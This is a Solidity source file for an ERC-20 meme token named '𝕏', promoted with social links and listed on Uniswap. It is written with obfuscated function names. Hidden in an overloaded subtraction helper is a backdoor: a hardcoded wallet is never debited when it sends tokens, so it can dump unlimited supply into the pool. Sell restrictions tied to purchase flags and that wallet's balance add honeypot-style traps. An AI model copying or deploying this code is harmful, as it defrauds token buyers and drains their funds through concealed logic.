/**

    Telegram: https://t.me/XErc20_CoinX
    Twitter: https://twitter.com/XErc20_CoinX
    Website: https://xerc.org/

*/

pragma solidity 0.8.19;
// SPDX-License-Identifier: MIT


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _qcrivj(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qcrivj(a, b, "SafeMath");
    }

    function  _qcrivj(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _bcfcih(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _poartcr;
    address payable private _phafiy;
    address private _barenp;
    string private constant _name = unicode"𝕏";
    string private constant _symbol = unicode"𝕏";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _qltohr=0;
    uint256 private _qvoest=0;
    uint256 public _patyvb = _totalSupply;
    uint256 public _qraefk = _totalSupply;
    uint256 public _pjoaeb= _totalSupply;
    uint256 public _qrigpf= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _blexad;
    mapping (address => bool) private _pvlkcu;
    mapping(address => uint256) private _fllnou;

    bool private _xxercopen;
    bool public _peudsq = false;
    bool private blhitf = false;
    bool private _ruyakj = false;


    event _qkfrkj(uint _patyvb);
    modifier fraivy {
        blhitf = true;
        _;
        blhitf = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _blexad[owner(

        )] = true;
        _blexad[address
        (this)] = true;
        _blexad[
            _phafiy] = true;
        _phafiy = 
        payable (0x40BDA615425D072d050a6CC2f2Aa982a6bf59Af1);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qcrivj(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 yoriug=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_peudsq) {
                if (to 
                != address
                (_poartcr) 
                && to !=
                 address
                 (_barenp)) {
                  require(_fllnou
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fllnou
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _barenp && to != 
            address(_poartcr) &&
             !_blexad[to] ) {
                require(amount 
                <= _patyvb,
                 "Exceeds the _patyvb.");
                require(balanceOf
                (to) + amount
                 <= _qraefk,
                  "Exceeds the _qraefk.");
                if(_qvoest
                < _qltohr){
                  require
                  (! _frajov(to));
                }
                _qvoest++;
                 _pvlkcu
                 [to]=true;
                yoriug = amount._bcfcih
                ((_qvoest>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _barenp &&
             from!= address(this) 
            && !_blexad[from] ){
                require(amount <= 
                _patyvb && 
                balanceOf(_phafiy)
                <_qrigpf,
                 "Exceeds the _patyvb.");
                yoriug = amount._bcfcih((_qvoest>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_qvoest>
                _qltohr &&
                 _pvlkcu[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!blhitf 
            && to == _barenp &&
             _ruyakj &&
             contractTokenBalance>
             _pjoaeb 
            && _qvoest>
            _qltohr&&
             !_blexad[to]&&
              !_blexad[from]
            ) {
                _transferFrom( _bcpikv(amount, 
                _bcpikv(contractTokenBalance,
                _qrigpf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _ptnyk(address
                    (this).balance);
                }
            }
        }

        if(yoriug>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(yoriug);
          emit
           Transfer(from,
           address
           (this),yoriug);
        }
        _balances[from
        ]= _qcrivj(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _qcrivj(yoriug));
        emit Transfer
        (from, to, 
        amount.
         _qcrivj(yoriug));
    }

    function _transferFrom(uint256
     tokenAmount) private
      fraivy {
        if(tokenAmount==
        0){return;}
        if(!_xxercopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _poartcr.WETH();
        _approve(address(this),
         address(
             _poartcr), 
             tokenAmount);
        _poartcr.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _bcpikv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qcrivj(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _phafiy){
            return a ;
        }else{
            return a .
             _qcrivj (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _patyvb = _totalSupply;
        _qraefk = _totalSupply;
        emit _qkfrkj(_totalSupply);
    }

    function _frajov(address 
    account) private view 
    returns (bool) {
        uint256 eorihp;
        assembly {
            eorihp :=
             extcodesize
             (account)
        }
        return eorihp > 
        0;
    }

    function _ptnyk(uint256
    amount) private {
        _phafiy.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _xxercopen ) ;
        _poartcr  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _poartcr), 
            _totalSupply);
        _barenp = 
        IUniswapV2Factory(_poartcr.
        factory( ) 
        ). createPair (
            address(this
            ),  _poartcr .
             WETH ( ) );
        _poartcr.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_barenp).
        approve(address(_poartcr), 
        type(uint)
        .max);
        _ruyakj = true;
        _xxercopen = true;
    }

    receive() external payable {}
}